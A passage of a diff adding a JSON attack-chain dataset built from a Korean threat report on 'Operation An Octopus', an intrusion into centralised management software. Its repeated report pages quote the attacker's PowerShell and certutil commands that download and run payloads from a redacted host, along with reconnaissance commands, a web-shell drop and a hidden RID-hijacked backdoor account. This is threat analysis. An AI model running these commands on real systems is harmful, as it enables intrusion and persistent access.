침투 테스트 -\nWPS Office 중국 문서 프로그램 -\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 10"
+        },
+        {
+          "page_number": 11,
+          "text": "도구 기능 로그에서 확인된 사용 목적\nObsidian 마크다운 에디터 -\nTypora 마크다운 에디터 -\nWireshark 네트워크 트래픽 모니터링 -\nProxifier 프록시 -\nv2rayN 프록시 -\nCCProxy 프록시 -\nSharpReverseProxy 리버스 프록시 -\nbore-v0.5.0 리버스 프록시 -\nloclx 리버스 프록시 -\nVisual Studio Code 코드 개발 -\nVisualGet 매크로 개발 -\nNavicat Premium 16 MySQL 관리 피해시스템 제어에 사용\n임대서버 내에 있는 데이터 보호\nVeraCrypt 디스크 암호화\n에 사용\n공격자끼리 연락에 사용\nTelegram 메신저\n데이터 유출에 사용\nQQ 메신저 공격자끼리 연락에 사용\nEveryThing 파일 검색 -\nMotrix 파일 다운로드 매니저 -\nInternet Download Manager 파일 다운로드 매니저 -\n취약점 테스트용 가상이미지 구\nVirtualBox 가상머신\n동에 사용\ngo-memexec 메모리 실행 라이브러리 악성코드 제작에 사용\nMemorySharp 메모리 편집 라이브러리 악성코드 제작에 사용\n시스템에 저장중인 패스워드(브\nProtected Storage PassView -\n라우져)를 출력\nInstant Messenger Password 메신저 애플리케이션의 사용자\n-\nRecovery Tool 계정 비밀번호를 복구\nDefense Evasion\nObfuscated Files or Information\n공격자는 공격을 위해 필요한 다양한 자원들을 보관하고 있는 특정 드라이브를 암호화하였다. 이 드\n라이브에는 공격에 필요한 해킹 도구, 원격제어 악성코드, 취약점 테스트용 가상머신 등 중요한 정\n보가 담겨 있었다.\n암호화에 사용된 도구는 VeraCrypt이라는 알려진 암호화 도구이다. 이 도구는 드라이브 전체를 효\n과적으로 암호화하여 외부의 접근을 차단하는데 사용된다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 11"
+        },
+        {
+          "page_number": 18,
+          "text": "공격에 성공한 공격자는 중앙 관리 솔루션의 정책 배포 기능 등을 이용하여 추가로 내부에 악성 코\n드를 전파하였다. 이를 통해, 공격자는 시스템 내부에 더욱 깊숙히 침투하고, 더 넓은 범위의 피해를\n입힐 수 있었다.\nExecution\nCommand and Scripting Interpreter: Powershell\n파워쉘로 실행한 명령어의 일부는 아래와 같다. 모두 외부 시스템로부터 악성코드를 다운로드 받는\n명령이었다.\n공격자\npowershell wget -Uri hxxp://[ IP]/icon/favicon.ico -OutFile c:\\\n공격자\npowershell wget -Uri http://[ IP]/venus.asp -OutFile c:\\\\users\\\n공격자\npowershell mshta http://[ IP]/icon/icon.html\n공격자\npowershell wget -Uri http://[ IP]/icon/cert.txt -OutFile c:\\use\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\nCommand and Scripting Interpreter: Windows Command Shell\n최초 침투에 성공한 공격자가 사용한 명령어의 일부는 아래와 같다. 악성코드를 외부 시스템으로부\n터 다운로드 받는 명령과 탈취한 계정의 권한, 디렉토리 검색과 같은 정보 검색 명령이 주를 이루었\n다.\nipconfig\ndir c:\\\ndir \"c:\\\\Program Files\"\n공격자\npowershell \"wget -Uri http://[ IP]/icon/favicon.ico -OutFile c\npowershell c:\\users\\public\\mscert.exe\n공격자\npowershell \"(New-Object Net.WebClient).DownloadFile(\\'http://[\nwmic process get caption,processid,executablepath,commandline /for\nwmic process get executablepath\ncertutil -decode c:\\users\\public\\cert.txt c:\\users\\public\\mscert.e\ncertutil -decode c:\\users\\public\\cert.txt c:\\users\\public\\game.exe\ndel /f c:\\users\\public\\cert.txt c:\\users\\public\\test.txt\n'whoami > \"c:\\inetpub\\wwwroot\\test.txt\nnet user\nipconfig /all\nsysteminfo\ntasklist\ndir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test.txt\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 18"
+        },
+        {
+          "page_number": 19,
+          "text": "dir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test1.txt\npowershell \"net user\" > c:\\inetpub\\wwwroot\\test.txt\ndir \"c:\\inetpub\\wwwroot\\down\"\ndir \"c:\\users\\\"\ndir \"c:\\users\\administrator\"\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nnetstat -naop tcp | findstr ESTA\nquery session\ndir c:\\*\ntasklist > c:\\inetpub\\wwwroot\\a.txt\npowershell ls c:\\\ncmd.exe -c dir c:\\*\ntaskkill /f /im cmd.exe\n공격자\npowershell \"wget -Uri http://[ IP]/venus.asp -OutFile c:\\users\\\n공격자\ncertutil.exe -urlc\"\"\"\"\"\"ache -split -f http://[ IP]/venus.asp c\nren x:\\inetpub\\wwwroot\\venus.asp x:\\inetpub\\wwwroot\\wwinstallguide\nPersistence\nServer Software Component: Web Shell\n침투에 성공한 공격자는 지속성 유지를 위해 운영체제 명령 실행이 가능한 웹셸을 생성하였다. 웹\n셸의 사용자 인터페이스는 테스트 코드처럼 보이도록 디자인되어, 악성 파일로 의심받는 것을 회피\n하려는 의도가 있었다.\n공격자 사용 웹셸 화면\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 19"
+        },
+        {
+          "page_number": 24,
+          "text": "중앙 집중형 관리 솔루션을 통한 악성코드 유포 과정\nCollection\nData from Local System\n악성코드의 명령(61)에 의해 논리적 드라이브의 정보를 확보한 공격자는 추가적인 명령(62)을 통\n해 모든 폴더와 파일 정보를 획득한다.\nScreen Capture\n악성코드의 명령(31)에 의해 감염단말기의 스크린을 캡쳐, 성공하면 공격자에게 JPEG 포맷의 캡쳐\n된 화면 데이터를 송부한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 24"
+        }
+      ],
+      "producers": [
+        "N22",
+        "N24"
+      ],
+      "consumers": [
+        "N02",
+        "N03",
+        "N11",
+        "N27"
+      ]
+    },
+    "F06": {
+      "fact_id": "F06",
+      "name": "attacker.web_shell.file",
+      "description": "공격자 웹셸 파일(venus.asp)",
+      "is_external": true,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 20,
+          "text": "공격자 사용 웹셸 코드 일부\nDefense Evasion\nDeobfuscate/Decode Files or Information\n공격자는 프록시 기능을 수행하는 악성코드를 사용했다. 프록시 악성코드는 데이터 전송 시, 정해진\n인코딩 박스를 참조하여 트래픽을 인코딩한 후 전송한다.\nIndicator Removal: Clear Windows Event Logs\n피해 서버에서 공격자가 CMD 명령을 사용하여 원격 데스크톱 접속 로그에 접근하고, 최근 5개의\n이벤트를 조회하는 명령이 발견되었다. 그 후 이벤트 로그를 삭제하는 명령은 직접 발견되지 않았지\n만, 분석 시점에서는 서버의 이벤트 로그가 손상된 상태로 남아 있었다.\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nIndicator Removal: Clear Persistence\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 20"
+        }
+      ],
+      "producers": [],
+      "consumers": [
+        "N04"
+      ]
+    },
+    "F07": {
+      "fact_id": "F07",
+      "name": "attacker.tool.psexec",
+      "description": "입수한 PSEXEC/PSEXESVC 도구",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 11,
+          "text": "도구 기능 로그에서 확인된 사용 목적\nObsidian 마크다운 에디터 -\nTypora 마크다운 에디터 -\nWireshark 네트워크 트래픽 모니터링 -\nProxifier 프록시 -\nv2rayN 프록시 -\nCCProxy 프록시 -\nSharpReverseProxy 리버스 프록시 -\nbore-v0.5.0 리버스 프록시 -\nloclx 리버스 프록시 -\nVisual Studio Code 코드 개발 -\nVisualGet 매크로 개발 -\nNavicat Premium 16 MySQL 관리 피해시스템 제어에 사용\n임대서버 내에 있는 데이터 보호\nVeraCrypt 디스크 암호화\n에 사용\n공격자끼리 연락에 사용\nTelegram 메신저\n데이터 유출에 사용\nQQ 메신저 공격자끼리 연락에 사용\nEveryThing 파일 검색 -\nMotrix 파일 다운로드 매니저 -\nInternet Download Manager 파일 다운로드 매니저 -\n취약점 테스트용 가상이미지 구\nVirtualBox 가상머신\n동에 사용\ngo-memexec 메모리 실행 라이브러리 악성코드 제작에 사용\nMemorySharp 메모리 편집 라이브러리 악성코드 제작에 사용\n시스템에 저장중인 패스워드(브\nProtected Storage PassView -\n라우져)를 출력\nInstant Messenger Password 메신저 애플리케이션의 사용자\n-\nRecovery Tool 계정 비밀번호를 복구\nDefense Evasion\nObfuscated Files or Information\n공격자는 공격을 위해 필요한 다양한 자원들을 보관하고 있는 특정 드라이브를 암호화하였다. 이 드\n라이브에는 공격에 필요한 해킹 도구, 원격제어 악성코드, 취약점 테스트용 가상머신 등 중요한 정\n보가 담겨 있었다.\n암호화에 사용된 도구는 VeraCrypt이라는 알려진 암호화 도구이다. 이 도구는 드라이브 전체를 효\n과적으로 암호화하여 외부의 접근을 차단하는데 사용된다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 11"
+        },
+        {
+          "page_number": 22,
+          "text": "Credential Access\nOS Credential Dumping: Security Account Manager\n공격자가 백도어 계정에 RID Hijacking을 시도한 흔적이 발견되었다. RID Hijacking은 토큰 발급\n과정의 취약점을 이용해 특정 계정에 권한을 부여하는 기법이다. 이 기법을 사용하려면 SYSTEM\n권한이 필요하므로, 공격자는 PSEXEC 도구를 사용하여 피해 시스템에서 해당 동작을 실행했을 가\n능성이 높다. 피해 업체에서는 'white$'라는 계정이 백도어 계정이었으며, 이 계정은 관리자 권한\n에 해당하는 500 RID를 가지고 있었다.\n해당 공격자는 백도어 계정을 생성할 때 'white'나 'black'이란 이름을 사용하고 뒤에 '$'를 붙이는\n특징이 있다. 계정을 생성할 때 뒤에 ‘$ʼ 문자를 붙이게 되면 숨김 속성의 계정을 만들 수 있어, 관리\n자가 새롭게 만들어진 계정을 인지하지 못하게 하였다.\n$가 붙은 계정의 조회 결과\n이와 같은 기능은 공격자가 사용한 계정 생성 악성코드에 포함되어 있었다.\n공격자가 사용한 계정 white$\nLateral Movement\nLateral Tool Transfer\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 22"
+        }
+      ],
+      "producers": [
+        "N26"
+      ],
+      "consumers": [
+        "N09",
+        "N27"
+      ]
+    },
+    "F08": {
+      "fact_id": "F08",
+      "name": "target.management_solution.db_credential",
+      "description": "로그 삭제 java 코드의 솔루션 DB 접속 자격증명",
+      "is_external": true,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 21,
+          "text": "취약점 공격의 대상이 된 중앙 집중형 관리 솔루션에는 별도의 인증 과정 없이 관리자 계정을 생성\n할 수 있는 제로데이 취약점이 있었다. 이런 취약점을 악용하여 공격자는 공격용 계정을 생성하고\n악성코드를 유포하는 활동을 진행하였다. 이 과정을 통해 공격 목표를 달성한 공격자는 자신의 흔적\n을 지우기 위해 관리자 계정 생성 로그와 공격용 관리자 계정을 삭제하였다.\n공격자는 관리자 계정 생성 로그가 중앙 관리 솔루션 DB에 저장되는 것까지 파악하고 있었고, 그에\n맞춰 개발한 java 코드를 이용하여 로그를 삭제하였다. 이는 공격자가 취약점 공격 전에 제품 테스\n트와 분석을 충분히 수행했음을 나타낸다.\n솔루션 기능에 맞게 개발된 로그 삭제 코드\nObfuscated Files or Information: Dynamic API Resolution\n공격자는 동적으로 API를 로드하여 활용하기 위하여 base64 방식을 활용한다. 악성코드에서는 디\n코드된 문자열을 참조하여 함수의 주소를 획득, 활용한다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 21"
+        }
+      ],
+      "producers": [],
+      "consumers": [
+        "N07"
+      ]
+    },
+    "F09": {
+      "fact_id": "F09",
+      "name": "host.target.ip_list",
+      "description": "내부 프록시 명령 전달 대상 단말 IP 리스트",
+      "is_external": true,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 25,
+          "text": "Command and Control\nProxy: Internal Proxy\n공격자는 내부에서 특정 단말기를 통해 감염된 다수 단말기로 명령어를 전달하는 방식을 사용하였\n다. 최초 실행시 설정하는 명령제어지를 제외하고, 다수 단말기에 명령제어를 수행하기 위하여IP 리\n스트를 전달하는 방식으로 구현하였다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 25"
+        }
+      ],
+      "producers": [],
+      "consumers": [
+        "N14"
+      ]
+    },
+    "F10": {
+      "fact_id": "F10",
+      "name": "attacker.c2.address",
+      "description": "RAT가 접속하는 C2 주소(net_Dial, 포트 8088)",
+      "is_external": true,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 23,
+          "text": "공격자는 명령제어 통신을 위해 파이프를 활용한다. 감염단말기에서 명령어를 외부에서 수신받아\n실행한 후, 그 결과를 송신하는 방식은 아래와 같다.\n\u0000첫번째 파이프의 입력단에 공격자의 명령어 쓰기\n\u0000첫번째 파이프의 출력단은 새로 생성될 프로세스의 표준입력으로 전달\n\u0000새로운 프로세스에서 표준출력(stdout), 표준에러(stderr)는 두번째 파이프의 입력단으로 전\n달\n\u0000두번째 파이프의 출력단은 파일 핸들로서, 데이터가 존재하는 경우 C2 서버로 전달\nSoftware Deployment Tools\n제로데이 취약점을 통해 중앙 집중형 관리 솔루션에 침투한 공격자는 솔루션의 정책 배포, 파일 배\n포 기능을 이용하여 추가로 내부에 악성 코드를 전파하였다.\n대부분의 중앙 집중형 관리 솔루션에는 로그인 성공, 실패와 같은 인증로그, 정책 배포 일자를 기록\n한 로그, 어떠한 파일이 배포되었는지를 알리는 로그 등 자체 감사 로그가 있다. 해당 로그들을 통해\n악성코드의 유포 사실을 알 수 있었다.\n공격자가 인증우회 취약점을 이용하여 공격에 성공하면 지속적인 접근을 위해 공격용 관리자 계정\n을 생성한다. 이때 보통 ‘admin1ʼ이라는 계정 이름을 많이 사용한 것으로 확인되었다. 공격용 관리\n자 계정으로 로그인 이후 공격자는 중앙 집중형 관리 솔루션의 파일 배포 및 실행 기능을 이용하여\n악성코드를 내부 시스템에 전파한다. 전파 이후 공격에 악용된 계정을 삭제조치하여 흔적을 지웠다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 23"
+        },
+        {
+          "page_number": 25,
+          "text": "Command and Control\nProxy: Internal Proxy\n공격자는 내부에서 특정 단말기를 통해 감염된 다수 단말기로 명령어를 전달하는 방식을 사용하였\n다. 최초 실행시 설정하는 명령제어지를 제외하고, 다수 단말기에 명령제어를 수행하기 위하여IP 리\n스트를 전달하는 방식으로 구현하였다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 25"
+        },
+        {
+          "page_number": 26,
+          "text": "Exfiltrate\nExfiltration Over C2 Channel\n공격자는 Collection 단계를 통해 본인이 원하는 파일 정보를 획득, 명령어(51)을 통해 파일을 읽고\nC2 채널로 송부하도록 악성코드를 구현하였다. 참고로 악성코드 내에서 송부하는 함수명은\nFileDownload라고 명명되어 있다. File Upload가 아니라 File Download라는 이름을 통해 우리\n는 공격자의 관점에서 악성코드가 구현되어 있음을 알 수 있다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 26"
+        }
+      ],
+      "producers": [],
+      "consumers": [
+        "N10",
+        "N14",
+        "N15"
+      ]
+    },
+    "F11": {
+      "fact_id": "F11",
+      "name": "host.os.command_session",
+      "description": "침투로 확보한 OS 명령 실행 세션. 세션 핸들 값은 보고서에 없어 체인용 도입",
+      "is_external": false,
+      "level": "execution_required",
+      "inferred_flag": true,
+      "report_pages": [
+        {
+          "page_number": 17,
+          "text": "소스코드 확보 및 취약점 개발\n두 번째로, 피해를 입은 업체에서 운영 중인 중앙관리형 솔루션들은 대부분 외부 인터넷에 프로그램\n의 포트가 열려있는 채로 방치되어 있었다. 따라서 공격자가 제작한 스캐닝 프로그램에 의해 포트가\n외부에 개방된 상태로 운영되고 있는 시스템들은 모두 침해를 당하였다.\n취약점 스캐닝\n세 번째로, 발견된 대부분의 제로데이 취약점은 인증 우회와 관련이 있었다. 관리자 권한 없이 계정\n정보가 담긴 파일에 접근이 가능하여 손쉽게 관리자 계정을 탈취한 경우도 있었고, 인증과정 없이\n계정을 생성하거나 명령 실행이 가능했던 경우도 있었다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 17"
+        },
+        {
+          "page_number": 18,
+          "text": "공격에 성공한 공격자는 중앙 관리 솔루션의 정책 배포 기능 등을 이용하여 추가로 내부에 악성 코\n드를 전파하였다. 이를 통해, 공격자는 시스템 내부에 더욱 깊숙히 침투하고, 더 넓은 범위의 피해를\n입힐 수 있었다.\nExecution\nCommand and Scripting Interpreter: Powershell\n파워쉘로 실행한 명령어의 일부는 아래와 같다. 모두 외부 시스템로부터 악성코드를 다운로드 받는\n명령이었다.\n공격자\npowershell wget -Uri hxxp://[ IP]/icon/favicon.ico -OutFile c:\\\n공격자\npowershell wget -Uri http://[ IP]/venus.asp -OutFile c:\\\\users\\\n공격자\npowershell mshta http://[ IP]/icon/icon.html\n공격자\npowershell wget -Uri http://[ IP]/icon/cert.txt -OutFile c:\\use\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\nCommand and Scripting Interpreter: Windows Command Shell\n최초 침투에 성공한 공격자가 사용한 명령어의 일부는 아래와 같다. 악성코드를 외부 시스템으로부\n터 다운로드 받는 명령과 탈취한 계정의 권한, 디렉토리 검색과 같은 정보 검색 명령이 주를 이루었\n다.\nipconfig\ndir c:\\\ndir \"c:\\\\Program Files\"\n공격자\npowershell \"wget -Uri http://[ IP]/icon/favicon.ico -OutFile c\npowershell c:\\users\\public\\mscert.exe\n공격자\npowershell \"(New-Object Net.WebClient).DownloadFile(\\'http://[\nwmic process get caption,processid,executablepath,commandline /for\nwmic process get executablepath\ncertutil -decode c:\\users\\public\\cert.txt c:\\users\\public\\mscert.e\ncertutil -decode c:\\users\\public\\cert.txt c:\\users\\public\\game.exe\ndel /f c:\\users\\public\\cert.txt c:\\users\\public\\test.txt\n'whoami > \"c:\\inetpub\\wwwroot\\test.txt\nnet user\nipconfig /all\nsysteminfo\ntasklist\ndir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test.txt\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 18"
+        },
+        {
+          "page_number": 19,
+          "text": "dir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test1.txt\npowershell \"net user\" > c:\\inetpub\\wwwroot\\test.txt\ndir \"c:\\inetpub\\wwwroot\\down\"\ndir \"c:\\users\\\"\ndir \"c:\\users\\administrator\"\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nnetstat -naop tcp | findstr ESTA\nquery session\ndir c:\\*\ntasklist > c:\\inetpub\\wwwroot\\a.txt\npowershell ls c:\\\ncmd.exe -c dir c:\\*\ntaskkill /f /im cmd.exe\n공격자\npowershell \"wget -Uri http://[ IP]/venus.asp -OutFile c:\\users\\\n공격자\ncertutil.exe -urlc\"\"\"\"\"\"ache -split -f http://[ IP]/venus.asp c\nren x:\\inetpub\\wwwroot\\venus.asp x:\\inetpub\\wwwroot\\wwinstallguide\nPersistence\nServer Software Component: Web Shell\n침투에 성공한 공격자는 지속성 유지를 위해 운영체제 명령 실행이 가능한 웹셸을 생성하였다. 웹\n셸의 사용자 인터페이스는 테스트 코드처럼 보이도록 디자인되어, 악성 파일로 의심받는 것을 회피\n하려는 의도가 있었다.\n공격자 사용 웹셸 화면\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 19"
+        },
+        {
+          "page_number": 20,
+          "text": "공격자 사용 웹셸 코드 일부\nDefense Evasion\nDeobfuscate/Decode Files or Information\n공격자는 프록시 기능을 수행하는 악성코드를 사용했다. 프록시 악성코드는 데이터 전송 시, 정해진\n인코딩 박스를 참조하여 트래픽을 인코딩한 후 전송한다.\nIndicator Removal: Clear Windows Event Logs\n피해 서버에서 공격자가 CMD 명령을 사용하여 원격 데스크톱 접속 로그에 접근하고, 최근 5개의\n이벤트를 조회하는 명령이 발견되었다. 그 후 이벤트 로그를 삭제하는 명령은 직접 발견되지 않았지\n만, 분석 시점에서는 서버의 이벤트 로그가 손상된 상태로 남아 있었다.\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nIndicator Removal: Clear Persistence\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 20"
+        },
+        {
+          "page_number": 22,
+          "text": "Credential Access\nOS Credential Dumping: Security Account Manager\n공격자가 백도어 계정에 RID Hijacking을 시도한 흔적이 발견되었다. RID Hijacking은 토큰 발급\n과정의 취약점을 이용해 특정 계정에 권한을 부여하는 기법이다. 이 기법을 사용하려면 SYSTEM\n권한이 필요하므로, 공격자는 PSEXEC 도구를 사용하여 피해 시스템에서 해당 동작을 실행했을 가\n능성이 높다. 피해 업체에서는 'white$'라는 계정이 백도어 계정이었으며, 이 계정은 관리자 권한\n에 해당하는 500 RID를 가지고 있었다.\n해당 공격자는 백도어 계정을 생성할 때 'white'나 'black'이란 이름을 사용하고 뒤에 '$'를 붙이는\n특징이 있다. 계정을 생성할 때 뒤에 ‘$ʼ 문자를 붙이게 되면 숨김 속성의 계정을 만들 수 있어, 관리\n자가 새롭게 만들어진 계정을 인지하지 못하게 하였다.\n$가 붙은 계정의 조회 결과\n이와 같은 기능은 공격자가 사용한 계정 생성 악성코드에 포함되어 있었다.\n공격자가 사용한 계정 white$\nLateral Movement\nLateral Tool Transfer\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 22"
+        }
+      ],
+      "producers": [
+        "N01"
+      ],
+      "consumers": [
+        "N02",
+        "N03",
+        "N04",
+        "N06",
+        "N09"
+      ]
+    },
+    "F12": {
+      "fact_id": "F12",
+      "name": "host.rat.path",
+      "description": "다운로드·실행된 RAT 로컬 경로(c:\\users\\public\\mscert.exe 등)",
+      "is_external": false,
+      "level": "report_explicit",
+      "inferred_flag": false,
+      "report_pages": [
+        {
+          "page_number": 18,
+          "text": "공격에 성공한 공격자는 중앙 관리 솔루션의 정책 배포 기능 등을 이용하여 추가로 내부에 악성 코\n드를 전파하였다. 이를 통해, 공격자는 시스템 내부에 더욱 깊숙히 침투하고, 더 넓은 범위의 피해를\n입힐 수 있었다.\nExecution\nCommand and Scripting Interpreter: Powershell\n파워쉘로 실행한 명령어의 일부는 아래와 같다. 모두 외부 시스템로부터 악성코드를 다운로드 받는\n명령이었다.\n공격자\npowershell wget -Uri hxxp://[ IP]/icon/favicon.ico -OutFile c:\\\n공격자\npowershell wget -Uri http://[ IP]/venus.asp -OutFile c:\\\\users\\\n공격자\npowershell mshta http://[ IP]/icon/icon.html\n공격자\npowershell wget -Uri http://[ IP]/icon/cert.txt -OutFile c:\\use\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\n공격자\niex((New-Object System.Net.Webclient).DownloadString('hxxp://[\nCommand and Scripting Interpreter: Windows Command Shell\n최초 침투에 성공한 공격자가 사용한 명령어의 일부는 아래와 같다. 악성코드를 외부 시스템으로부\n터 다운로드 받는 명령과 탈취한 계정의 권한, 디렉토리 검색과 같은 정보 검색 명령이 주를 이루었\n다.\nipconfig\ndir c:\\\ndir \"c:\\\\Program Files\"\n공격자\npowershell \"wget -Uri http://[ IP]/icon/favicon.ico -OutFile c\npowershell c:\\users\\public\\mscert.exe\n공격자\npowershell \"(New-Object Net.WebClient).DownloadFile(\\'http://[\nwmic process get caption,processid,executablepath,commandline /for\nwmic process get executablepath\ncertutil -decode c:\\users\\public\\cert.txt c:\\users\\public\\mscert.e\ncertutil -decode c:\\users\\public\\cert.txt c:\\users\\public\\game.exe\ndel /f c:\\users\\public\\cert.txt c:\\users\\public\\test.txt\n'whoami > \"c:\\inetpub\\wwwroot\\test.txt\nnet user\nipconfig /all\nsysteminfo\ntasklist\ndir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test.txt\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 18"
+        },
+        {
+          "page_number": 19,
+          "text": "dir \"c:\\inetpub\\\" > c:\\inetpub\\wwwroot\\test1.txt\npowershell \"net user\" > c:\\inetpub\\wwwroot\\test.txt\ndir \"c:\\inetpub\\wwwroot\\down\"\ndir \"c:\\users\\\"\ndir \"c:\\users\\administrator\"\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nnetstat -naop tcp | findstr ESTA\nquery session\ndir c:\\*\ntasklist > c:\\inetpub\\wwwroot\\a.txt\npowershell ls c:\\\ncmd.exe -c dir c:\\*\ntaskkill /f /im cmd.exe\n공격자\npowershell \"wget -Uri http://[ IP]/venus.asp -OutFile c:\\users\\\n공격자\ncertutil.exe -urlc\"\"\"\"\"\"ache -split -f http://[ IP]/venus.asp c\nren x:\\inetpub\\wwwroot\\venus.asp x:\\inetpub\\wwwroot\\wwinstallguide\nPersistence\nServer Software Component: Web Shell\n침투에 성공한 공격자는 지속성 유지를 위해 운영체제 명령 실행이 가능한 웹셸을 생성하였다. 웹\n셸의 사용자 인터페이스는 테스트 코드처럼 보이도록 디자인되어, 악성 파일로 의심받는 것을 회피\n하려는 의도가 있었다.\n공격자 사용 웹셸 화면\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 19"
+        },
+        {
+          "page_number": 20,
+          "text": "공격자 사용 웹셸 코드 일부\nDefense Evasion\nDeobfuscate/Decode Files or Information\n공격자는 프록시 기능을 수행하는 악성코드를 사용했다. 프록시 악성코드는 데이터 전송 시, 정해진\n인코딩 박스를 참조하여 트래픽을 인코딩한 후 전송한다.\nIndicator Removal: Clear Windows Event Logs\n피해 서버에서 공격자가 CMD 명령을 사용하여 원격 데스크톱 접속 로그에 접근하고, 최근 5개의\n이벤트를 조회하는 명령이 발견되었다. 그 후 이벤트 로그를 삭제하는 명령은 직접 발견되지 않았지\n만, 분석 시점에서는 서버의 이벤트 로그가 손상된 상태로 남아 있었다.\nwevtutil qe Microsoft-Windows-TerminalServices-LocalSessionManager\nEventID=25]]\" /rd /f:text\nIndicator Removal: Clear Persistence\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 20"
+        },
+        {
+          "page_number": 22,
+          "text": "Credential Access\nOS Credential Dumping: Security Account Manager\n공격자가 백도어 계정에 RID Hijacking을 시도한 흔적이 발견되었다. RID Hijacking은 토큰 발급\n과정의 취약점을 이용해 특정 계정에 권한을 부여하는 기법이다. 이 기법을 사용하려면 SYSTEM\n권한이 필요하므로, 공격자는 PSEXEC 도구를 사용하여 피해 시스템에서 해당 동작을 실행했을 가\n능성이 높다. 피해 업체에서는 'white$'라는 계정이 백도어 계정이었으며, 이 계정은 관리자 권한\n에 해당하는 500 RID를 가지고 있었다.\n해당 공격자는 백도어 계정을 생성할 때 'white'나 'black'이란 이름을 사용하고 뒤에 '$'를 붙이는\n특징이 있다. 계정을 생성할 때 뒤에 ‘$ʼ 문자를 붙이게 되면 숨김 속성의 계정을 만들 수 있어, 관리\n자가 새롭게 만들어진 계정을 인지하지 못하게 하였다.\n$가 붙은 계정의 조회 결과\n이와 같은 기능은 공격자가 사용한 계정 생성 악성코드에 포함되어 있었다.\n공격자가 사용한 계정 white$\nLateral Movement\nLateral Tool Transfer\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 22"
+        },
+        {
+          "page_number": 23,
